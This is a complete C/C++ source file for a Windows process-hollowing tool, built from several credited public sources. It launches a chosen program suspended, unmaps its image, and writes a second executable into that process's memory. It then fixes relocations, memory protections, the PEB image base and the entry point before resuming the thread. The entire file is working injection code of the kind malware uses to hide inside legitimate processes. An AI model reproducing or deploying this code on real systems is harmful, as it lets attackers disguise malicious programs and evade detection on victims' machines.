/*
Sources:
https://github.com/idan1288/ProcessHollowing32-64
https://github.com/m0n0ph1/Process-Hollowing
https://blog.kwiatkowski.fr/?q=en/process_hollowing
http://www.rohitab.com/discuss/topic/41529-stealthier-process-hollowing-code/
*/

#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include "general.h"


#define CountRelocationEntries(dwBlockSize) (dwBlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY)

typedef NTSTATUS(WINAPI *prototype_NtUnmapViewOfSection)(
	_In_     HANDLE ProcessHandle,
	_In_opt_ PVOID  BaseAddress
	);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;

} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

int main(int argc, char* argv[])
{

	if (argc != 3)
	{
		printf("Usage: processhollowing.exe [target binary] [to be run binary]\r\n");
		return -1;
	}

	printf("[*] Creating process in suspended state\r\n");

	/* Creating process that we will inject into */
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

	CreateProcessA(0, argv[1], 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);

	if (!pProcessInfo->hProcess)
	{
		ErrorExit(TEXT("CreateProcessA"));
	}
	
	printf("[+] Create process successful!\r\n");
	
	printf("[+] Read the executable to be loaded.\r\n");

	/* Opening and reading file that we will inject */
	HANDLE hFile;
	hFile = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		TerminateProcess(pProcessInfo->hProcess, -1);
		ErrorExit(TEXT("CreateFileA"));
	}

	DWORD dwFileSize;
	dwFileSize = GetFileSize(hFile, NULL);

	PVOID lpFileBuffer;
	lpFileBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	DWORD lpNumberOfBytesRead = 0;

	if (!ReadFile(hFile, lpFileBuffer, dwFileSize, &lpNumberOfBytesRead, NULL))
	{
		TerminateProcess(pProcessInfo->hProcess, 1);
		ErrorExit(TEXT("ReadFile"));
	}

	CloseHandle(hFile);

	PIMAGE_DOS_HEADER pImageDosHeader;
	PIMAGE_NT_HEADERS pImageNTHeader;
	PIMAGE_SECTION_HEADER pImageSectionHeader;

	pImageDosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer;

	// Check if the file is really an executable
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) //IMAGE_DOS_SIGNATURE = MZ
	{
		TerminateProcess(pProcessInfo->hProcess, -1);
		printf("[-] The file is not an executable, no MZ header found\r\n");
		ExitProcess(-1);
	}

	// Get the address of the IMAGE_NT_HEADERS
	pImageNTHeader = (PIMAGE_NT_HEADERS)((LPBYTE)lpFileBuffer + pImageDosHeader->e_lfanew); 
	LPCONTEXT lpContext = new CONTEXT();
	lpContext->ContextFlags = CONTEXT_INTEGER;

	// Get the thread context of the child process's primary thread
	GetThreadContext(pProcessInfo->hThread, lpContext);

	// Get the PEB address from the ebx register and read the base address of the executable image from the PEB
	LPVOID lpProcessImageBaseAddress;


#ifdef _WIN64
	if (pImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
	{
		printf("[-] The executable is 32 bit, please use the 32 bit ProcessHollowing binary\r\n");
		TerminateProcess(pProcessInfo->hProcess, -1);
		ExitProcess(-1);
	}
	ReadProcessMemory(pProcessInfo->hProcess, (PVOID)(lpContext->Rdx + (sizeof(SIZE_T) * 2)), &lpProcessImageBaseAddress, sizeof(lpProcessImageBaseAddress), NULL);
#endif

#ifdef _X86_
	if (pImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
	{
		printf("[-] The executable is 64 bit, please use the 64 bit ProcessHollowing binary\r\n");
		TerminateProcess(pProcessInfo->hProcess, -1);
		ExitProcess(-1);
	}
	ReadProcessMemory(pProcessInfo->hProcess, (PVOID)(lpContext->Ebx + 8), &lpProcessImageBaseAddress, sizeof(lpProcessImageBaseAddress), NULL);
#endif

	printf("[*] Base address of child process: 0x%Ix\n", (SIZE_T)lpProcessImageBaseAddress);

	/* check if image can be relocated and load the file to memory */
	LPVOID lpNewImageBaseAddress = NULL;
	IMAGE_DATA_DIRECTORY relocData = pImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if(!(pImageNTHeader->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) && relocData.VirtualAddress!=0 && relocData.Size!=0)
	{
		// Try to unmap the original executable from the child process.
		printf("[*] Unmapping original executable image from child process\n");
		prototype_NtUnmapViewOfSection pfnNtUnmapViewOfSection = NULL;
		GetFunctionAddressFromDll("ntdll.dll", "NtUnmapViewOfSection", (PVOID *)&pfnNtUnmapViewOfSection);
		if (!pfnNtUnmapViewOfSection(pProcessInfo->hProcess, lpProcessImageBaseAddress))
		{
			printf("[i] Process is relocatable\r\n");
			printf("[*] Unallocation successful, allocating memory in child process in the same location.\r\n");
			// Allocate memory for the executable image, try on the same memory as the current process
			lpNewImageBaseAddress = VirtualAllocEx(pProcessInfo->hProcess, lpProcessImageBaseAddress, pImageNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (!lpNewImageBaseAddress)
			{
				TerminateProcess(pProcessInfo->hProcess, -1);
				ErrorExit(TEXT("VirtualAllocEx"));
			}
		}
		else
		{
			//if the previous failed try to load it to a new location
			printf("[*] Trying to allocate new memory space\r\n");
			lpNewImageBaseAddress = VirtualAllocEx(pProcessInfo->hProcess, NULL, pImageNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (!lpNewImageBaseAddress)
			{
				TerminateProcess(pProcessInfo->hProcess, -1);
				ErrorExit(TEXT("VirtualAllocEx"));
			}
		}
		printf("[+] Memory allocated. Address: 0x%Ix\r\n", (SIZE_T)lpNewImageBaseAddress);
	}
	else
	{
		printf("[i] Process is not relocatable, trying to allocate region\r\n");
		lpNewImageBaseAddress = VirtualAllocEx(pProcessInfo->hProcess, (PVOID)(pImageNTHeader->OptionalHeader.ImageBase), pImageNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!lpNewImageBaseAddress)
		{
			printf("[*] Memory seem to be used, trying to unmap memory region where the image should be loaded: 0x%Ix\r\n", pImageNTHeader->OptionalHeader.ImageBase); //in case there is something mapped
			prototype_NtUnmapViewOfSection pfnNtUnmapViewOfSection = NULL;
			GetFunctionAddressFromDll("ntdll.dll", "NtUnmapViewOfSection", (PVOID *)&pfnNtUnmapViewOfSection);
			if (!pfnNtUnmapViewOfSection(pProcessInfo->hProcess, (PVOID)(pImageNTHeader->OptionalHeader.ImageBase)))
			{
				printf("[*] Unallocation successful, allocating memory in child process in the same location.\r\n");
				// Allocate memory for the executable image
				lpNewImageBaseAddress = VirtualAllocEx(pProcessInfo->hProcess, (PVOID)(pImageNTHeader->OptionalHeader.ImageBase), pImageNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				if (!lpNewImageBaseAddress)
				{
					TerminateProcess(pProcessInfo->hProcess, -1);
					ErrorExit(TEXT("VirtualAllocEx"));
				}
				printf("[+] Memory allocated. Address: 0x%Ix\r\n", (SIZE_T)lpNewImageBaseAddress);
			}
			else
			{
				// couldn't unmap the memory region where the image should be loaded
				TerminateProcess(pProcessInfo->hProcess, -1);
				ErrorExit(TEXT("pfnNtUnmapViewOfSection"));
			}
		}
	}

	// offset between the the original ImageBase found in the file and the location loaded in the memory
	SIZE_T dwDelta = (SIZE_T)lpNewImageBaseAddress - pImageNTHeader->OptionalHeader.ImageBase;
	
	// Overwrite ImageBase value in the original file in memory
	pImageNTHeader->OptionalHeader.ImageBase = (SIZE_T)lpNewImageBaseAddress;
	printf("[*] Writing executable image into child process.\r\n");

	// Write the PE header of the executable file to the process
	if (!WriteProcessMemory(pProcessInfo->hProcess, lpNewImageBaseAddress, lpFileBuffer, pImageNTHeader->OptionalHeader.SizeOfHeaders, NULL))
	{
		TerminateProcess(pProcessInfo->hProcess, -1);
		ErrorExit(TEXT("WriteProcessMemory"));
	}

	// Write the remaining sections of the executable file to the process
	for (int i = 0; i<pImageNTHeader->FileHeader.NumberOfSections; i++)
	{
		pImageSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)lpFileBuffer + pImageDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		printf("[*] Writing %s to 0x%Ix\r\n", pImageSectionHeader->Name, (SIZE_T)((LPBYTE)lpNewImageBaseAddress + pImageSectionHeader->VirtualAddress));
		if (!WriteProcessMemory(pProcessInfo->hProcess, (PVOID)((LPBYTE)lpNewImageBaseAddress + pImageSectionHeader->VirtualAddress), (PVOID)((LPBYTE)lpFileBuffer + pImageSectionHeader->PointerToRawData), pImageSectionHeader->SizeOfRawData, NULL))
		{
			TerminateProcess(pProcessInfo->hProcess, -1);
			ErrorExit(TEXT("WriteProcessMemory"));
		}
	}

	/* Reloaction of VAs */	
	if (dwDelta != 0) //only if needed
	{
		for (int x = 0; x < pImageNTHeader->FileHeader.NumberOfSections; x++)
		{
			// find .reloc section
			char* pSectionName = ".reloc";
			pImageSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)lpFileBuffer + pImageDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (x * sizeof(IMAGE_SECTION_HEADER)));
			if (memcmp(pImageSectionHeader->Name, pSectionName, strlen(pSectionName)))
				continue;

			printf("[*] Rebasing image\r\n");

			DWORD dwRelocSectionRawData = pImageSectionHeader->PointerToRawData;
			DWORD dwOffsetInRelocSection = 0;

			IMAGE_DATA_DIRECTORY relocData = pImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			// parse reloaction data
			while (dwOffsetInRelocSection < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)((SIZE_T)lpFileBuffer + dwRelocSectionRawData + dwOffsetInRelocSection);

				dwOffsetInRelocSection += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)((SIZE_T)lpFileBuffer + dwRelocSectionRawData + dwOffsetInRelocSection);

				for (DWORD y = 0; y < dwEntryCount; y++)
				{
					dwOffsetInRelocSection += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					SIZE_T dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;

					//printf("[*] Reading from 0x%p\r\n", (PVOID)((SIZE_T)lpNewImageBaseAddress + dwFieldAddress));
					SIZE_T dwBuffer = 0;
					if (!ReadProcessMemory(pProcessInfo->hProcess, (PVOID)((SIZE_T)lpNewImageBaseAddress + dwFieldAddress), &dwBuffer, sizeof(SIZE_T), 0))
					{
						TerminateProcess(pProcessInfo->hProcess, -1);
						ErrorExit(TEXT("ReadProcessMemory"));
					}

					//printf("[*] Relocating 0x%p -> 0x%p\r\n", dwBuffer, dwBuffer + dwDelta);

					dwBuffer += dwDelta;
					//printf("[*] Writing 0x%p to 0x%p\r\n", dwBuffer, (PVOID)((SIZE_T)lpNewImageBaseAddress + dwFieldAddress));
					if (!WriteProcessMemory(pProcessInfo->hProcess, (PVOID)((SIZE_T)lpNewImageBaseAddress + dwFieldAddress), &dwBuffer, sizeof(SIZE_T), NULL))
					{
						TerminateProcess(pProcessInfo->hProcess, -1);
						ErrorExit(TEXT("WriteProcessMemory"));
					}
				}
			}
		}
	}
	
	/* Fix memory protection, pages shouldn't be RWX */

	printf("[*] Restoring memory page protections\r\n");
	// protect the PE headers, set as RO
	DWORD lpflOldProtect = 0;
	if (!VirtualProtectEx(pProcessInfo->hProcess, lpNewImageBaseAddress, pImageNTHeader->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &lpflOldProtect))
	{
		TerminateProcess(pProcessInfo->hProcess, -1);
		ErrorExit(TEXT("VirtualProtectEx"));
	}

	// protect the image sections
	for (int i = 0; i<pImageNTHeader->FileHeader.NumberOfSections; i++)
	{
		pImageSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)lpFileBuffer + pImageDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		printf("[*] Restoring memory protection for %s\r\n", pImageSectionHeader->Name);
		DWORD flNewProtect = 0;
		if ((pImageSectionHeader->Characteristics) & IMAGE_SCN_MEM_EXECUTE) //executable
		{
			if ((pImageSectionHeader->Characteristics) & IMAGE_SCN_MEM_READ) //executable, readable
			{
				if ((pImageSectionHeader->Characteristics) & IMAGE_SCN_MEM_WRITE) //executable, readable, writeable
				{
					flNewProtect = PAGE_EXECUTE_READWRITE;
				}
				else //executable, readable, not writeable
				{
					flNewProtect = PAGE_EXECUTE_READ;
				}
			}
			else // executable, not readable
			{
				if ((pImageSectionHeader->Characteristics) & IMAGE_SCN_MEM_WRITE) // executable, not readable,  writable
				{
					flNewProtect = PAGE_EXECUTE_WRITECOPY;
				}
				else // executable, not readable, not writable
				{
					flNewProtect = PAGE_EXECUTE;
				}
			}
		}
		else
		{
			if ((pImageSectionHeader->Characteristics) & IMAGE_SCN_MEM_READ) //not executable, readable
			{
				if ((pImageSectionHeader->Characteristics) & IMAGE_SCN_MEM_WRITE) //not executable, readable, writeable
				{
					flNewProtect = PAGE_READWRITE;
				}
				else //not executable, readable, not writeable
				{
					flNewProtect = PAGE_READONLY;
				}
			}
			else // not executable, not readable
			{
				if ((pImageSectionHeader->Characteristics) & IMAGE_SCN_MEM_WRITE) // not executable, not readable,  writable
				{
					flNewProtect = PAGE_WRITECOPY;
				}
				else // not executable, not readable, not writable
				{
					flNewProtect = PAGE_NOACCESS;
				}
			}
		}
		if ((pImageSectionHeader->Characteristics) & IMAGE_SCN_MEM_NOT_CACHED)
		{
			flNewProtect |= PAGE_NOCACHE;
		}
		if (!VirtualProtectEx(pProcessInfo->hProcess, (PVOID)((LPBYTE)lpNewImageBaseAddress + pImageSectionHeader->VirtualAddress), pImageSectionHeader->SizeOfRawData, flNewProtect, &lpflOldProtect))
		{
			printf("[-] Couldn't restore memory protection for %s, but going on...\r\n", pImageSectionHeader->Name);
		}
	}

#ifdef _WIN64
	lpContext->Rcx = (SIZE_T)((LPBYTE)lpNewImageBaseAddress + pImageNTHeader->OptionalHeader.AddressOfEntryPoint);
	printf("[+] New entry point: 0x%Ix\r\n", lpContext->Rcx);
	printf("[*] Updating PEB->ImageBase\r\n");
	if(!WriteProcessMemory(pProcessInfo->hProcess, (PVOID)(lpContext->Rdx + (sizeof(SIZE_T) * 2)), &lpNewImageBaseAddress, sizeof(lpNewImageBaseAddress), NULL))
	{
		TerminateProcess(pProcessInfo->hProcess, -1);
		ErrorExit(TEXT("WriteProcessMemory"));
	}
#endif

#ifdef _X86_
	lpContext->Eax = (SIZE_T)((LPBYTE)lpNewImageBaseAddress + pImageNTHeader->OptionalHeader.AddressOfEntryPoint);
	printf("[+] New entry point: 0x%Ix\r\n", lpContext->Eax);
	printf("[*] Updating PEB->ImageBase\r\n");
	if (!WriteProcessMemory(pProcessInfo->hProcess, (PVOID)(lpContext->Ebx + 8), &lpNewImageBaseAddress, sizeof(lpNewImageBaseAddress), NULL))
	{
		TerminateProcess(pProcessInfo->hProcess, -1);
		ErrorExit(TEXT("WriteProcessMemory"));
	}
#endif	

	printf("[*] Setting the context of the child process's primary thread.\r\n");
//	system("pause");

	if (!SetThreadContext(pProcessInfo->hThread, lpContext)) // Set the thread context of the child process's primary thread
	{
		TerminateProcess(pProcessInfo->hProcess, -1);
		ErrorExit(TEXT("SetThreadContext"));
	}
	printf("[*] Resuming child process's primary thread.\r\n");

	ResumeThread(pProcessInfo->hThread); // Resume the primary thread

	printf("[*] Thread resumed.\r\n");

	return 0;
}

